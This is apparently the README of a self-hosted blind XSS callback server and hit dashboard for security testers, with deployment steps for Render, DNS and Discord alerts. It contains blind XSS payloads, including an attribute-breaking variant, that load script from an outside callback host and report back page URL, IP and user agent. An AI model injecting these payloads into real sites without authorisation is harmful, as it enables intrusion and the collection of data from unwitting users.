A self-hosted Blind XSS payload server and hit dashboard with unlimited markers, page grouping, filters, import/export, and Discord alerts.

## Why This Exists

Blind XSS testing is painful when your callback tooling does not give you enough control.

- Burp Collaborator and Interactsh payloads are temporary or tied to a session.
- Public callback services can expire, rotate, or disappear.
- Classic XSS Hunter-style setups are useful, but many workflows end up with one generic payload path.
- When testing many fields, forms, endpoints, and roles, you need to know exactly which payload fired.

This project gives you your own domain and unlimited marker paths:

```html
<script src="https://xss.yourdomain.com/x/signup-name"></script>
<script src="https://xss.yourdomain.com/x/admin-note"></script>
<script src="https://xss.yourdomain.com/x/billing-address"></script>
```

Everything after `/x/` is the marker. When it fires, the dashboard shows where it came from, when it triggered, and can send a Discord notification.

## What You Get

- Payload route: `/x/<marker>`
- Password-protected dashboard: `/dashboard`
- Unlimited markers, for example `/x/firstname-profile`, `/x/admin-note`, `/x/support-ticket`
- Hit grouping by page URL/site
- Filters with suggestions for page URL, IP, and marker
- 3-dot page actions: copy URL, cut, paste into another page group, delete
- Full hit download as `callbacks.jsonl`
- Import old hit logs and append them without replacing current hits
- Optional Discord webhook notifications for every hit
- Optional Render persistent disk support so logs survive redeploys

## Recommended Architecture

Use a dedicated subdomain:

```text
Main website:       https://yourdomain.com
Blind XSS server:   https://xss.yourdomain.com
Dashboard:          https://xss.yourdomain.com/dashboard
Payload base:       https://xss.yourdomain.com/x/<marker>
```

Do not put this behind a static host. It needs a backend because it receives and stores callbacks.

## Step 1: Fork This Repository

1. Open this repository on GitHub.
2. Click **Fork**.
3. Choose your GitHub account.
4. Keep your fork **private** if you do not want your dashboard code/config visible.

Your fork will look like:

```text
https://github.com/YOUR_USERNAME/Blind-XSS-HIT-Dashboard
```

## Step 2: Clone Your Fork

Clone your fork on your machine only so you can change example values and push your own copy.

```bash
git clone https://github.com/YOUR_USERNAME/Blind-XSS-HIT-Dashboard.git
cd Blind-XSS-HIT-Dashboard
```

## Step 3: Replace Example Domains

Search the repo for:

```text
xss.example.com
example.com
```

Replace them in documentation or examples with your real callback subdomain, for example:

```text
xss.yourdomain.com
```

The important runtime value is still the Render environment variable:

```text
PUBLIC_BASE_URL=https://xss.yourdomain.com
```

## Step 4: Push Your Fork

After your README/example changes:

```bash
git add .
git commit -m "Configure dashboard for my domain"
git push origin main
```

## Step 5: Create Render Web Service

1. Open [Render](https://render.com/).
2. Click **New +**.
3. Choose **Web Service**.
4. Connect GitHub.
5. Select your forked repository:

```text
YOUR_USERNAME/Blind-XSS-HIT-Dashboard
```

6. Use these settings:

```text
Environment: Node
Build Command: npm install
Start Command: npm start
```

7. Create the service.

Render will give you a temporary domain like:

```text
https://blind-xss-hit-dashboard.onrender.com
```

Do not use that as your final payload domain if you have your own domain. Use it only until your custom subdomain is connected.

## Step 6: Set Render Environment Variables

In Render:

```text
Your Web Service -> Environment
```

Add:

| Key | Example | Required |
| --- | --- | --- |
| `PUBLIC_BASE_URL` | `https://xss.yourdomain.com` | Yes |
| `DASHBOARD_USERNAME` | `bugatsec` | Yes |
| `DASHBOARD_PASSWORD` | `use-a-strong-password` | Yes |
| `SESSION_SECRET` | `long-random-string` | Strongly recommended |
| `DISCORD_WEBHOOK_URL` | `https://discord.com/api/webhooks/...` | Optional |
| `DATA_DIR` | `/var/data` | Recommended with persistent disk |

Then redeploy the service.

You can check whether dashboard auth is configured:

```text
https://xss.yourdomain.com/health
```

Expected:

```json
{
  "authConfigured": true
}
```

The `/health` endpoint does not reveal your username, password, session secret, or Discord webhook URL.

## Step 7: Add Persistent Storage

If you want hits to stay forever until you delete them, add a persistent disk.

In Render:

1. Open your Web Service.
2. Go to **Disks**.
3. Add a disk.
4. Mount path:

```text
/var/data
```

5. Set this environment variable:

```text
DATA_DIR=/var/data
```

The hit log will be stored at:

```text
/var/data/callbacks.jsonl
```

Without a persistent disk, Render may lose the log on redeploy/restart.

## Step 8: Connect Your Subdomain

Use a subdomain like:

```text
xss.yourdomain.com
```

In Render:

1. Open your Web Service.
2. Go to **Settings -> Custom Domains**.
3. Add:

```text
xss.yourdomain.com
```

4. Render will show a DNS target.

In your domain/DNS dashboard:

1. Create the DNS record Render tells you to create.
2. Usually this is a CNAME from:

```text
xss
```

to something like:

```text
your-service.onrender.com
```

3. Wait for DNS to propagate.
4. Wait for Render TLS/HTTPS to become active.

Finally, make sure Render has:

```text
PUBLIC_BASE_URL=https://xss.yourdomain.com
```

Redeploy after changing it.

## Step 9: Add Discord Alerts

In Discord:

1. Open the channel where you want alerts.
2. Go to **Edit Channel -> Integrations -> Webhooks**.
3. Create a webhook.
4. Copy the webhook URL.
5. Add it in Render:

```text
DISCORD_WEBHOOK_URL=https://discord.com/api/webhooks/...
```

Every new hit sends a Discord embed with:

- marker
- source type
- IP
- page URL/referrer
- user agent

## Step 10: Use The Dashboard

Open:

```text
https://xss.yourdomain.com/dashboard
```

Login with:

```text
DASHBOARD_USERNAME
DASHBOARD_PASSWORD
```

The dashboard gives you:

- payload builder
- total hit count
- unique marker count
- page URL groups
- filters for page URL, IP, and marker
- 3-dot page actions
- import/export controls
- clear-all logs

## Payload Usage

Basic marker:

```html
<script src="https://xss.yourdomain.com/x/blind-xss"></script>
```

Marker per injection point:

```html
<script src="https://xss.yourdomain.com/x/signup-name"></script>
<script src="https://xss.yourdomain.com/x/profile-bio"></script>
<script src="https://xss.yourdomain.com/x/admin-note"></script>
<script src="https://xss.yourdomain.com/x/billing-address"></script>
```

The dashboard groups hits by page URL and shows the marker so you know exactly which payload fired.

The payload builder can also produce a two-script variant:

```html
<script src="https://xss.yourdomain.com/x/blind-xss"></script>"/><script src="https://xss.yourdomain.com/x/blind-xss1"></script>
```

This can help in some broken HTML contexts where one form of injection closes/escapes differently than another.

## What Gets Logged

The app records:

- marker
- page URL or referrer
- IP address
- user agent
- browser language
- viewport
- source type
- timestamp

Source types:

| Source | Meaning |
| --- | --- |
| `payload-load` | The `/x/<marker>` JavaScript URL was requested |
| `script` | The JavaScript executed and posted back |
| `image` | The image fallback fired |
| `import` | The hit came from an imported log |

## Dashboard Page Actions

Each page group has a 3-dot menu:

- `Copy URL` copies the page URL/group key
- `Cut` selects all hits in that page group
- `Paste here` moves cut hits into another page group
- `Delete` deletes all hits for that page group

## Import And Export

`Download hits` downloads the current backend log:

```text
callbacks.jsonl
```

Selecting an import file previews it in the browser. It is not uploaded immediately.

`Add to logs` appends the previewed hits to the backend log. It does not replace existing hits.

Supported import formats:

- JSONL, one hit per line
- JSON array
- JSON object with a `callbacks` array

## Security Notes

- Keep your fork private if you do not want others to inspect your setup.
- Do not commit real dashboard passwords.
- Do not commit Discord webhook URLs.
- Do not commit `callbacks.jsonl`.
- Use HTTPS for your callback domain.
- Use a strong `SESSION_SECRET`.
- Rotate credentials if you accidentally expose them.
